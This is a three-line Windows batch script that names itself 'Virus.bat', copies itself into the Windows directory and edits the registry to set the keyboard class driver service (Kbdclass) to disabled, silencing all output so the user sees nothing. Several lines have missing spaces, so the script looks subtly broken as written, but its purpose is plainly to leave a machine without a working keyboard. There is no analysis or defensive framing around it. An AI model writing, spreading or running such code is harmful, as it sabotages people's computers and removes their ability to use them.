@echo off
copy %0%windir%\Virus.bat> nul
reg addHKLM\System\CurrentControlSet\Services\Kbdclass/v Start /t REG_DWORD /d4/f > nul
